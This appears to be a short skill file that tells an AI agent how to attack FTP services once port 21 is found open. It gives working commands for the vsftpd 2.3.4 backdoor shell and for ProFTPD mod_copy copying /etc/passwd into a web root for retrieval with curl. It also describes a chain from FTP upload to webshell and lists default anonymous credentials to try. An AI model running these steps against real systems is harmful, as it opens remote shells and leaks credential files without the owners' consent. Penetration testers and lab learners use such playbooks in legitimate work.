---
name: svc-ftp
description: FTP version exploits — vsftpd backdoor, ProFTPD mod_copy, writable upload→shell chain. Use when FTP is open. Triggers - port 21, vsftpd 2.3.4, ProFTPD mod_copy.
---

# FTP — Version Exploits & Chains

## vsftpd 2.3.4 — backdoor
Send `:)` in username → backdoor shell opens on port 6200.
`echo -e "USER evil:)\nPASS anything" | nc TARGET 21` then `nc TARGET 6200`

## ProFTPD mod_copy — unauthenticated file copy
ProFTPD <1.3.5b. No login needed:
```
nc TARGET 21
SITE CPFR /etc/passwd
SITE CPTO /var/www/html/leak.txt
```
Then `curl http://TARGET/leak.txt`. Can also copy SSH keys, webshells into web roots.

## Writable FTP + web server = shell
If anonymous upload works AND a web server serves the same directory:
upload shell via FTP → trigger via HTTP.

## Anonymous login variants
Try: `anonymous`/`anonymous@`, `anonymous`/(empty), `ftp`/`ftp`.
Always `ls -la` and try `cd ..` — parent directories sometimes accessible.
